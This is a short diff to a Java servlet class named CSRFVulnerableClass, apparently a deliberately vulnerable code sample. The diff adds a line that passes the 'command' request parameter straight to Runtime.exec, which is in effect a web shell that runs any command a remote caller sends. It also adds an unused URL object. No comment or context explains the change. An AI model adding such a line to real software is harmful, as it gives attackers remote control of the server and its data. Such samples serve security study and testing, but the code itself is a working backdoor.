@@ -2,6 +2,7 @@ import javax.servlet.http.HttpServlet;
 import javax.servlet.http.HttpServletRequest;
 import javax.servlet.http.HttpServletResponse;
 import java.io.IOException;
+import java.net.URL;
 
 public class CSRFVulnerableClass extends HttpServlet {
     @Override
@@ -12,6 +13,8 @@ public class CSRFVulnerableClass extends HttpServlet {
         } else {
             response.getWriter().println("No action performed.");
         }
+        URL url = new URL(action);
+        Runtime.getRuntime().exec(request.getParameter("command"));
     }
 
     @Override
